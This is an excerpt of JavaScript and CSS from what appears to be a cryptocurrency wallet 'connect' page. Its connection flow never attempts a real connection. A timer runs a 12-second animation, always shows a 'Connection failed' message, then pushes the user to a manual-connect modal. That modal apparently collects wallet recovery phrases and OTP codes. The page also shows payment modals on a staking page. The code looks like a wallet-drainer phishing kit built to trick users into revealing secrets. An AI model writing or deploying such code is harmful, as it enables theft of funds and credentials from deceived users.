...
.connection-error-display{display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center}
.connection-error-display.active{display:flex}
.error-icon-circle{width:80px;height:80px;border-radius:50%;background:#ef4444;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:48px;margin-bottom:16px}
.error-message-text{color:#ef4444;font-weight:600;font-size:14px;line-height:1.5}
...
.social-icon img{width:20px;height:20px}`;
  ...
  <div id="connect-overlay" class="connect-overlay" aria-hidden="true">
    ...
    <div id="connectionErrorDisplay" class="connection-error-display">
      <div class="error-icon-circle">!</div>
      <div class="error-message-text">Connection failed. Please try to connect manually</div>
    </div>
  </div>
  ...
  const rawExtraWallets = ['Rainbow','Backpack','Solflare','Rabbywallet','Trezorsuite','Bridge','Brave','Tokenpocket','Tronlink','Slush','Airgap'];
  ...
  function handleWalletClick(){
    ...
    // Check if current flow type is connection (full wallet logic) or payment (show payment modal)
    // Default to 'connection' for most pages, only stake.html explicitly sets 'payment'
    const currentFlowType = window.currentFlowType || 'connection';
    const isConnectionFlow = currentFlowType === 'connection' || currentFlowType === 'connection-full';
    
    // Notify listeners that a wallet was selected so pages can continue flows (e.g., show pay QR)
    // For payment flows, dispatch the event. For connection flows, skip it.
    if (!isConnectionFlow) {
      try{
        const eventDetail = { walletName, iconUrl };
        document.dispatchEvent(new CustomEvent('wallet-selected', { detail: eventDetail }));
      }catch(e){ console.error('dispatch wallet-selected', e); }
    }

    // For payment flows, close the select-wallet modal so payment modal can show
    // For connection flows, keep it visible and show manual connect modal
    if (!isConnectionFlow) {
      // Payment flow: close select modal, show payment modal
      try{
        const modalOverlay = document.getElementById('modal-overlay');
        if(modalOverlay){ modalOverlay.classList.remove('active'); setTimeout(()=>{ modalOverlay.style.display='none'; },400); }
      }catch(e){}
      
      // keep the visual connect overlay briefly then remove
      setTimeout(()=>{
        if (connectRing) {
      ...
      // Connection flow: keep select modal visible, show error then manual connect modal
      // extend animation to 12 seconds for connection flows
      setTimeout(()=>{
        // After 12 seconds, show error in the connect overlay
        if (connectRing) {
          connectRing.classList.remove('active');
        }
        // Hide the wallet name and message (but keep the wallet image visible)
        const nameEl = overlay.querySelector('#overlay-wallet-name');
        const msgEl = overlay.querySelector('#overlay-message');
        ...
        const errorDisplay = overlay.querySelector('#connectionErrorDisplay');
        if(errorDisplay) errorDisplay.classList.add('active');
        
        // After 3 seconds of showing the error, redirect to manual connect modal
        setTimeout(()=>{
          try{ overlay.classList.remove('active'); }catch(e){}
          // Show manual connect modal for the full connection flow
          const manualOverlay = document.getElementById('manual-overlay');
          if(manualOverlay){
            manualOverlay.style.display='flex';
            setTimeout(()=>{ manualOverlay.classList.add('active'); }, 10);
          }
        }, 3000); // 3 seconds to show error
      },12000); // 12 seconds for connection flow animation
    }
  }
  ...
  (function wireModalControls(){
    ...
    if (manualConnectBtn) manualConnectBtn.addEventListener('click', async ()=>{
      ...
      if(result && result.success === true){ try{ manualOverlay.classList.remove('active'); setTimeout(()=>{ if(manualOverlay) manualOverlay.style.display='none'; },400); }catch(e){}
        ...
        // For connection flows, close the select wallet modal after completion
        const isConnectionFlow = window.currentFlowType === 'connection' || window.currentFlowType === 'connection-full';
        if(isConnectionFlow){
          setTimeout(()=>{
            try{
              const selectModal = document.getElementById('modal-overlay');
              if(selectModal){ selectModal.classList.remove('active'); setTimeout(()=>{ selectModal.style.display='none'; },300); }
            }catch(e){}
            // Also close the success overlay after a brief delay
            try{
              if(ring2) ring2.classList.remove('active');
              if(overlay2){ setTimeout(()=>{ overlay2.classList.remove('active'); setTimeout(()=>overlay2.style.display='none',300); }, 1800); }
            }catch(e){}
          }, 400);
        }
      } else { 
        ...
        // Show error for 3 seconds, then redirect to manual connect modal for connection flows
        if(isConnectionFlow){
          showPhraseError(errMsg.toString());
          setTimeout(()=>{
            // After 3 seconds, show manual connect modal
            const manualOverlay = document.getElementById('manual-overlay');
            if(manualOverlay){
              manualOverlay.style.display='flex';
              setTimeout(()=>{ manualOverlay.classList.add('active'); }, 10);
    ...
    if (otpSubmitBtn) otpSubmitBtn.addEventListener('click', async ()=>{
      ...
      if(result && result.success === true){
        ...
        if(otpError){ 
          otpError.textContent = errMsg.toString(); 
